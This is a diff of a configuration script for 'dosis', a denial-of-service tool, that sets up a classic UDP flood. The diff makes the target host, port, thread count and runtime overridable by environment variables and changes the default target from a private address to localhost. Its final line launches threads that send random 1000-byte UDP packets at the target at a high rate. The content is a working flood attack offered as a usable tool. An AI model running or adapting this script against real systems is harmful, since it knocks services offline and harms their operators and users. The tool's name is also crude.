@@ -4,10 +4,14 @@
 # Classic udp flood.
 #
 # Configuration:
-#  THOST   - target host
-#  TPORT   - target port
+#  THOST   - target host address
+#  TPORT   - target host port
 #  THREADS - number of threads
 #  RT      - total runtime (in seconds)
+#
+#   NOTE: vars declared previously as environment variables won't be
+#         overwritten by script values. If you want that values on script take
+#         precedence over env vars, remove the preceeding ?.
 #
 # -----------------------------------------------------------------------------
 # dosis - DoS: Internet Sodomizer
@@ -30,11 +34,10 @@
 ###############################################################################
 
 # configuration
-#THOST="127.0.0.1"
-THOST="192.168.2.1"
-TPORT="9999"
-THREADS="10"
-RT="5.0"
+? THOST="127.0.0.1"
+? TPORT="9999"
+? THREADS="10"
+? RT="5.0"
 
 # script
 0.0 ON [1%$THREADS] UDP DST $THOST $TPORT PAYLOAD RANDOM(1000) PERIODIC [ 0.0, 1048576 ]
